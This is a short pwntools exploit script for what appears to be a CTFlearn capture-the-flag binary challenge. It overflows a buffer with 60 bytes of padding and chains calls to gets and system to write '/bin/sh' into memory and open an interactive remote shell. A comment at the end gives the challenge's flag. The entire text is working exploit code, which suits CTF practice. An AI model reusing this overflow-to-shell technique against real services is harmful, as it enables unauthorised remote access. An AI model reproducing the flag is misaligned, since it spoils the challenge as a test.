from pwn import *

gets = p32(0x8048400)
vuln = p32(0x80485b1)
system = p32(0x8048420)

padding = b"\x41"*60

p = remote("thekidofarcrania.com", 4902)

p.recv()
bss = p32(0x0804a080)
p.sendline(padding+gets+vuln+bss)
p.sendline(b"/bin/sh")
p.sendline(padding+system+p32(0xdeadc0de)+bss)
p.interactive()

#FLAG: CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}
